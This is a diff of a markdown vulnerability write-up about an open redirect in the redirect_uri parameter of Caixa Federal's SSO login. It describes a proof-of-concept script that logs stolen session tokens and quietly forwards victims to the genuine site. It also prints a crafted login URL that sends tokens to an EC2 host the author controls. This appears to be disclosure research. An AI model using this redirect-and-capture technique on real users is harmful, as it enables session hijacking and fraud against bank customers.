@@ -45,11 +45,7 @@ This page is the authentication screen for access to the citizen portal panel an
 
 The URL in question was as follows:
 
-```
-https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&
-client_id=portal-inter&segmento=CIDADAO01&template=portal
-&redirect_uri=https://acessoseguro.sso.caixa.gov.br/portal/login
-```
+[http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()
 
 The last parameter of the URL was what drew attention to the potential vulnerability: **&redirect_uri=**; The value entered in the parameter references to which URL the user will be redirected to when the user finishes the activity in question, which in this case is the login.
 
@@ -79,9 +75,7 @@ Determined to create a PoC from this theory, I wrote the following code:
 
 This code is responsible for capturing and storing Session Tokens what are sent to the "malicious" URL under my control. In addition to capturing the Session Token and storing it in a log file, this script redirects the user once again, this time going to the true URL and having a genuine session on the Caixa Federal system. As such, it is unlikely that an ordinary user will know that he is being scammed. The PoC URL was as follows:
 
-```
-https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/
-```
+[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)
 
 And this was the result:
 
